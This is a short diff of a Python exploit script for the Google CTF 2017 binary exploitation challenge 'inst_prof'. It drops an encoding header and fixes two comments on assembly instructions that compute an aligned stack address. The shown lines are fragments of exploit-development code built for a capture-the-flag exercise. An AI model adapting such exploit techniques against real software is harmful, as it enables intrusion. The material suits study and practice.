@@ -1,4 +1,3 @@
-# -*- coding: utf-8 -*-
 #
 # Google CTF 2017 pwn inst_prof
 #
@@ -65,8 +64,8 @@ if __name__ == "__main__":
     op += store_r15(offset) 
     op += assemble('mov r14, rcx') # rcx is 0x1000
     op += assemble('push rsp; pop r15')
-    op += assemble('dec r14') # rcx ix 0xfff
-    op += assemble('not r14') # rcx is 1111...1000
+    op += assemble('dec r14') # r14 ix 0xfff
+    op += assemble('not r14') # r14 is 1111...1000
     op += assemble('and r15, r14') # rsp & 1111...1000
     op += store_r15(offset + 0x8)
     
